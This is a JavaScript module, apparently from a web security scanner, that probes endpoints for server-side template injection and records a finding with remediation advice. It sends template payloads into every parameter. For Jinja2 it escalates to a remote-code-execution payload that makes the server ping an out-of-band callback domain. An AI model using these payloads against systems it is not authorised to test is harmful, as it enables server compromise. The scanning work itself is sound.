import axios from 'axios';
import { logger } from '../utils/logger.js';

const MATH_PROBES = [
    { payload: '{{7*7}}', expected: '49', engine: 'Generic/Jinja2/Twig/Vue' },
    { payload: '${7*7}', expected: '49', engine: 'Generic/Freemarker/EL' },
    { payload: '<%= 7*7 %>', expected: '49', engine: 'ERB' },
    { payload: '#{7*7}', expected: '49', engine: 'Pug/Ruby' }
];

const ENGINE_FINGERPRINTS = [
    { payload: '{{config}}', expectedMatch: /<Config/i, engine: 'Jinja2' },
    { payload: '{{_self}}', expectedMatch: /<Twig_Template/i, engine: 'Twig' },
    { payload: '${.version}', expectedMatch: /2\.\d+\.\d+/, engine: 'Freemarker' },
    { payload: '{{this}}', expectedMatch: /\[object Object\]/, engine: 'Handlebars' },
    { payload: '<%= ENV %>', expectedMatch: /\{.*PATH.*}/i, engine: 'ERB' }
];

export async function testSSTI(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    logger.info(`[SSTI] Testing endpoint: ${endpoint.url}`);

    try {
        let sstiConfirmed = false;
        let confirmedPayload = '';
        let confirmedEngine = '';

        // 1. Math Probes
        for (const probe of MATH_PROBES) {
            const reqData = { ...endpoint.data };
            const queryUrl = new URL(endpoint.url);
            
            // Inject into GET parameter if it exists, otherwise into body
            if (endpoint.method === 'GET' && Array.from(queryUrl.searchParams.keys()).length > 0) {
                for (const key of queryUrl.searchParams.keys()) {
                    queryUrl.searchParams.set(key, probe.payload);
                }
            } else if (endpoint.data && Object.keys(endpoint.data).length > 0) {
                for (const key in reqData) {
                    reqData[key] = probe.payload;
                }
            } else {
                continue; // No params to inject
            }

            try {
                const resp = await axios({
                    method: endpoint.method,
                    url: endpoint.method === 'GET' ? queryUrl.toString() : endpoint.url,
                    headers: endpoint.headers,
                    data: endpoint.method !== 'GET' ? reqData : undefined,
                    timeout,
                    validateStatus: () => true
                });

                const bodyStr = (typeof resp.data === 'string') ? resp.data : JSON.stringify(resp.data);
                
                // If it evaluated the math, we have SSTI!
                if (bodyStr.includes(probe.expected) && !bodyStr.includes(probe.payload)) {
                    sstiConfirmed = true;
                    confirmedPayload = probe.payload;
                    confirmedEngine = probe.engine;
                    break;
                }
            } catch (e) {}
        }

        // 2. Fingerprinting & Escalation (if confirmed)
        if (sstiConfirmed) {
            let specificEngine = confirmedEngine;
            let oastSuccess = false;
            let oastInteraction = null;
            let evidenceResp = '49';
            
            // Try specific fingerprints
            for (const finger of ENGINE_FINGERPRINTS) {
                 // Very simplistic injection replacement for proof of concept
                 const reqData = { ...endpoint.data };
                 const queryUrl = new URL(endpoint.url);
                 
                 if (endpoint.method === 'GET') {
                     for (const key of queryUrl.searchParams.keys()) {
                         queryUrl.searchParams.set(key, finger.payload);
                     }
                 } else {
                     for (const key in reqData) {
                         reqData[key] = finger.payload;
                     }
                 }
                 
                 try {
                     const resp = await axios({
                         method: endpoint.method,
                         url: endpoint.method === 'GET' ? queryUrl.toString() : endpoint.url,
                         headers: endpoint.headers,
                         data: endpoint.method !== 'GET' ? reqData : undefined,
                         timeout,
                         validateStatus: () => true
                     });
                     
                     const bodyStr = (typeof resp.data === 'string') ? resp.data : JSON.stringify(resp.data);
                     
                     if (finger.expectedMatch.test(bodyStr)) {
                         specificEngine = finger.engine;
                         evidenceResp = bodyStr.substring(0, 500);
                         break;
                     }
                 } catch (e) {}
            }

            // 3. OAST Escallation (Optional: depending on engine)
            if (options.oastClient && specificEngine === 'Jinja2') {
                const oastDomain = options.oastClient.getDomain();
                // Jinja2 RCE payload targeting ping
                const rcePayload = `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 ${oastDomain}').read() }}`;
                
                const reqData = { ...endpoint.data };
                for (const key in reqData) { reqData[key] = rcePayload; }
                
                try {
                     await axios.post(endpoint.url, reqData, { headers: endpoint.headers, timeout, validateStatus: () => true });
                     await new Promise(r => setTimeout(r, 3000));
                     const interactions = await options.oastClient.getInteractions();
                     if (interactions && interactions.length > 0) {
                         oastSuccess = true;
                         oastInteraction = interactions[0];
                     }
                } catch (e) {}
            }

            findings.push({
                title: 'Server-Side Template Injection (SSTI)',
                description: `The application dynamically renders user input in templates without sanitization. The underlying template engine appears to be ${specificEngine}. ${oastSuccess ? 'Remote Code Execution (RCE) was confirmed via an out-of-band DNS callback.' : 'Execution was confirmed via mathematical evaluation.'}`,
                category: 'INJECTION',
                severity: 'CRITICAL',
                cvss: oastSuccess ? 10.0 : 9.8,
                detectedBy: 'ssti-engine',
                confidence: 100,
                evidence: [
                    { type: 'REQUEST', title: 'Injection Payload', content: confirmedPayload },
                    { type: 'RESPONSE', title: 'Evaluated Result', content: evidenceResp },
                    ...(oastSuccess ? [{ type: 'NETWORK', title: 'OAST Interaction', content: JSON.stringify(oastInteraction, null, 2) }] : [])
                ],
                remediation: 'Do not concatenate user input into templates prior to evaluation. Use logic-less template engines (e.g., Mustache) or pass user input as data/context variables rather than raw template strings.'
            });
        }

    } catch (e) {
        logger.error(`[SSTI] Test failed: ${e.message}`);
    }

    return findings;
}
